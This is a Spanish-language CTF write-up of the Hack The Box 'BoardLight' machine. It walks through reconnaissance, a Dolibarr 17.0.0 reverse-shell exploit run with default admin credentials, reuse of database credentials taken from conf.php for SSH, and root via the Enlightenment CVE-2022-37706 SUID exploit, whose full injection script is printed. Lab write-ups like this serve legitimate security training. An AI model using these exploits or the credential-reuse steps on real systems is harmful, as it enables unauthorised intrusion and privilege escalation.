---
layout: single
title: Boardlight - Easy
excerpt: "
Hola a todos, hoy les presentaré la resolución de una máquina **Hack the box de dificultad Easy**. En esta máquina aprenderemos a explotar **Dolibar v17.0.0** con un exploit para luego conectarnos por **SSH** y llegar a ser **root** abusando de privilegios **SUID** con otro exploit "

date: 2024-08-9
classes: wide
header:
  teaser: /assets/images/2024-08-09-boardlight-easy/BoardLight.png
  teaser_home_page: true

categories:
  - Hack the box 
  - Pentesting
  - CTF
tags:  
  - Dolibar v17.0.0
  - SUID 
  - Exploit
  - Hack the box 

---

![](/assets/images/2024-08-09-boardlight-easy/BoardLight.png)

Hola a todos, hoy les presentaré la resolución de una máquina **Hack the box de dificultad Easy**. En esta máquina aprenderemos a explotar **Dolibar v17.0.0** con un exploit para luego conectarnos por **SSH** y llegar a ser **root** abusando de privilegios **SUID** con otro exploit

<br>

# Reconocimiento
- Enumeración con nmap
    
    Hacemos un `nmap` simple para ver los puertos que corren en la máquina
    
    ```python
    #nmap -p- -sS --min-rate 5000 -T5 -vvv -oN nmap.txt 10.10.11.11
    Increasing send delay for 10.10.11.11 from 0 to 5 due to 1097 out of 2742 dropped probes since last increase.
    Warning: 10.10.11.11 giving up on port because retransmission cap hit (2).
    Nmap scan report for 10.10.11.11
    Host is up, received echo-reply ttl 63 (0.33s latency).
    Scanned at 2024-08-08 21:39:03 CEST for 35s
    Not shown: 65125 closed tcp ports (reset), 408 filtered tcp ports (no-response)
    PORT   STATE SERVICE REASON
    22/tcp open  ssh     syn-ack ttl 63
    80/tcp open  http    syn-ack ttl 63
    
    Read data files from: /usr/bin/../share/nmap
    ```
    
    Una vez tenemos los puertos que en este caso como podemos ver es el `22(ssh)` y el `80(http)` 
    
    aplicamos un `nmap` más exhaustivo a dichos puertos
    
    ```python
    # nmap -p22,80 -sVC -v -oN port.txt 10.10.11.11
    Nmap scan report for 10.10.11.11
    Host is up (0.40s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
    |   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
    |_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
    | http-methods:
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Read data files from: /usr/bin/../share/nmap
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    ```
    
    Si aplicamos un `whatweb [http://10.10.11.11](http://10.10.11.11)` vemos que hay un correo que sigue con un `board.htb`
    
    ```python
    whatweb http://10.10.11.11
    http://10.10.11.11 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[info@board.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.11], JQuery[3.4.1], Script[text/javascript], X-UA-Compatible[IE=edge]
    ```
    
  Así que lo pondremos al `/etc/hosts`, ya que es posible que se aplique virtual hosting
    
    ```python
    10.10.11.11     board.htb
    ```
  ## Ahora accederemos a la web para poder determinar que clase de vulnerabilidades podemos encontrar
        
    Ya que anteriormente vimos que estaba abierto el puerto 80, vamos a acceder a la web a ver que encontramos
    
    ![Untitled](/assets/images/2024-08-09-boardlight-easy/Untitled.png)
    
    Si vamos mirando en la web la mayoría de pestañas que hay siempre te encontraras este formulario para rellenar , pero tras mucho rato probando cosas no funciona 
    
    ![Untitled](/assets/images/2024-08-09-boardlight-easy/Untitled%201.png)
    
    Así que vamos a buscar por subdominios

    ```python
     ffuf -w  /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://board.htb -H "Host: FUZZ.board.htb" -fs 15949
    ```
    
    ```python
  
            /'___\  /'___\           /'___\
           /\ \__/ /\ \__/  __  __  /\ \__/
           \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
            \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
             \ \_\   \ \_\  \ \____/  \ \_\
              \/_/    \/_/   \/___/    \/_/
    
           v2.1.0-dev
    ________________________________________________
    
     :: Method           : GET
     :: URL              : http://board.htb
     :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
     :: Header           : Host: FUZZ.board.htb
     :: Follow redirects : false
     :: Calibration      : false
     :: Timeout          : 10
     :: Threads          : 40
     :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
     :: Filter           : Response size: 15949
    ________________________________________________
    
    crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 358ms]
    :: Progress: [19966/19966] :: Job [1/1] :: 90 req/sec :: Duration: [0:03:10] :: Errors: 0 ::
    ```
    
    Y nos encontramos `crm`, vamos a añadirlos al `/etc/hosts` una vez hecho esto vemos, `un panel de login` en donde el `usuario: admin` y la `password:admin` y aparte encontramos algo que nos llama mucho la atención `Dolibarr 17.0.0`. Si buscamos si es vulnerable a algo encontramos que es vulnerable y podemos usar un [Exploit](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253) para poder acceder al sistema
    
    ![Untitled](/assets/images/2024-08-09-boardlight-easy/Untitled%202.png)
    
  # Explotación de vulnerabilidades `Dolibar 17.0.0.1`
    
    Nos descargamos el `Exploit` y le damos permisos de ejecución `chmod +x exploit.py`
    
    ```python
    git clone https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253.git
    ```
    
    Nos ponemos en escucha 
    
    ```python
    nc -nlvp 9001
    listening on [any] 9001 ...
    ```
    
    Ejecutaremos el `exploit` y una vez acabe la ejecución tendremos acceso a la máquina
    
    ```python
    python3 exploit.py http://crm.board.htb admin admin <LHOST> 9001
    
    [*] Trying authentication...
    [**] Login: admin
    [**] Password: admin
    [*] Trying created site...
    [*] Trying created page...
    [*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
    ```
    
  # Acceso a la máquina
    
    Ya hemos obtenido acceso y podemos observar que somos el usuario `www-data`
    
    ```python
    nc -nlvp 9001
    listening on [any] 9001 ...
    connect to [10.10.16.56] from (UNKNOWN) [10.10.11.11] 44614
    bash: cannot set terminal process group (890): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$
    ```     
    
    Si aplicamos el comando `id` podemos ver que no estamos dentro de la máquina  objetivo y somos el usuario `www-data`
    
    ```python
    www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```
    
    Si nos dirigimos 2 directorios hacia atrás encontramos esto 
    
    ```python
    www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ cd ../..
    www-data@boardlight:~/html/crm.board.htb/htdocs$ ls
    accountancy  comm        document.php       ftp                  margin              public             ticket
    adherents    commande    don                holiday              master.inc.php      reception          user
    admin        compta      ecm                hrm                  modulebuilder       recruitment        variants
    api          conf        emailcollector     imports              mrp                 resource           viewimage.php
    asset        contact     eventorganization  includes             multicurrency       robots.txt         webhook
    asterisk     contrat     expedition         index.php            opcachepreload.php  salaries           webservices
    barcode      core        expensereport      install              opensurvey          security.txt       website
    blockedlog   cron        exports            intracommreport      partnership         societe            workstation
    bom          custom      externalsite       knowledgemanagement  paybox              stripe             zapier
    bookcal      datapolicy  favicon.ico        langs                paypal              supplier_proposal
    bookmarks    dav         fichinter          loan                 printing            support
    categories   debugbar    filefunc.inc.php   mailmanspip          product             takepos
    collab       delivery    fourn              main.inc.php         projet              theme
    ```
    
    Vamos a ver el directorio `conf`, ya que se pueden encontrar credenciales de base de datos, encontramos 3 directorios y nos llama la atención el `conf.php`.
    
    Nos encontramos unas credenciales de la base de datos
    
    ```python
    www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
    <?php
    //
    // File generated by Dolibarr installer 17.0.0 on May 13, 2024
    //
    // Take a look at conf.php.example file for an example of conf.php file
    // and explanations for all possibles parameters.
    //
    $dolibarr_main_url_root='http://crm.board.htb';
    $dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
    $dolibarr_main_url_root_alt='/custom';
    $dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
    $dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
    $dolibarr_main_db_host='localhost';
    $dolibarr_main_db_port='3306';
    $dolibarr_main_db_name='dolibarr';
    $dolibarr_main_db_prefix='llx_';
    $dolibarr_main_db_user='dolibarrowner';
    $dolibarr_main_db_pass='serverfun2$2023!!';
    ```
    
    Aparte miramos el `/etc/passwd` encontramos un usuario llamado `larissa`
    
    ```python
    www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat /etc/passwd | grep -i sh$
    root:x:0:0:root:/root:/bin/bash
    larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
    ```
    
     Si nos conectamos con `ssh` con el usuario `larissa` y la `password` encontrada anteriormente, vemos que tenemos acceso
    
    ```python
    ssh larissa@10.10.11.11
    larissa@10.10.11.11's password:
    
    The programs included with the Ubuntu system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.
    
    Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
    applicable law.
    
    larissa@boardlight:~$
    ```
    
    Y si aplicamos un `ls` vemos el `user.txt(la flag)`
    
    ```python
    larissa@boardlight:~$ ls
    Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
    ```
    
  # Escalada a `root`
    
    Si buscamos por privilegios `SUID` encontramos esto que nos llama la atención, `que es enlightenment ?`
    
    ```python
    larissa@boardlight:~$ find / -perm -4000 2>/dev/null
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/xorg/Xorg.wrap
    /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
    /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
    /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
    /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
    ```
    
    **¿Qué es `Linux Enlightenment`?**
    
    `Enlightenment` es **un gestor de ventanas, compositor y escritorio minimalista para Linux (la plataforma principal), BSD y cualquier otro sistema UNIX compatible** .
    
    Si miramos la versión de `Enlightenment` encontramos esto de aquí ,`versión 0.23.1`
    
    ```python
    larissa@boardlight:~$ enlightenment -version
    ESTART: 0.00041 [0.00041] - Begin Startup
    ESTART: 0.00091 [0.00049] - Signal Trap
    ESTART: 0.00093 [0.00002] - Signal Trap Done
    ESTART: 0.00157 [0.00065] - Eina Init
    ESTART: 0.00356 [0.00198] - Eina Init Done
    ESTART: 0.00359 [0.00004] - Determine Prefix
    ESTART: 0.00411 [0.00052] - Determine Prefix Done
    ESTART: 0.00414 [0.00003] - Environment Variables
    ESTART: 0.00415 [0.00002] - Environment Variables Done
    ESTART: 0.00416 [0.00001] - Parse Arguments
    Version: 0.23.1
    ```
    
    Buscamos en `google` a ver si hay alguna vulnerabilidad disponible para esa versión y encontramos este `exploit` que nos será de gran ayuda,
    
    [https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit)
    
    - En pocas palabras lo que hace este script es mirar si `enlightenment_sys` tiene privilegios `SUID` para luego crear una carpeta temporal en `/tmp/net` para luego crear un archivo llamado `exploit` en `tmp` ,una vez echo esto escribe `/bin/sh` en el archivo `exploit` , le da permisos de ejecución a todos los usuarios y luego `ejecuta la shell` que montará el directorio con las opciones dadas para poder ejecutar el archivo `/tmp/exploit` (que contiene el comando `/bin/sh`), dando acceso a una `shell con privilegios elevados`.
        
        ```python
        #!/bin/bash
        
        echo "CVE-2022-37706"
        echo "[*] Trying to find the vulnerable SUID file..."
        echo "[*] This may take few seconds..."
        
        file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
        if [[ -z ${file} ]]
        then
        	echo "[-] Couldn't find the vulnerable SUID file..."
        	echo "[*] Enlightenment should be installed on your system."
        	exit 1
        fi
        
        echo "[+] Vulnerable SUID binary found!"
        echo "[+] Trying to pop a root shell!"
        mkdir -p /tmp/net
        mkdir -p "/dev/../tmp/;/tmp/exploit"
        
        echo "/bin/sh" > /tmp/exploit
        chmod a+x /tmp/exploit
        echo "[+] Enjoy the root shell :)"
        ${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
        ```
        
    
    Nos descargamos el código y lo copiamos a la máquina víctima, una vez copiado, le damos permisos de ejecución e iniciamos el `exploit`
    
    ```python
    larissa@boardlight:~/Desktop$ chmod +x exploit.sh
    larissa@boardlight:~/Desktop$ ./exploit.sh
    CVE-2022-37706
    [*] Trying to find the vulnerable SUID file...
    [*] This may take few seconds...
    [+] Vulnerable SUID binary found!
    [+] Trying to pop a root shell!
    [+] Enjoy the root shell :)
    mount: /dev/../tmp/: can't find in /etc/fstab.
    # whoami
    root
    ```
    
    Y encontraremos la `flag` en `/root/root.txt`

  # Finalización 
    Espero que hayan aprendido mucho haciendo esta máquina y les haya servido de ayuda mi explicación para poder entender esta **CTF**. Muchas gracias por leer el artículo y no olviden seguirme en <a href="https://github.com/0x832/">GitHub</a>, ya que también iré subiendo herramientas de hacking.
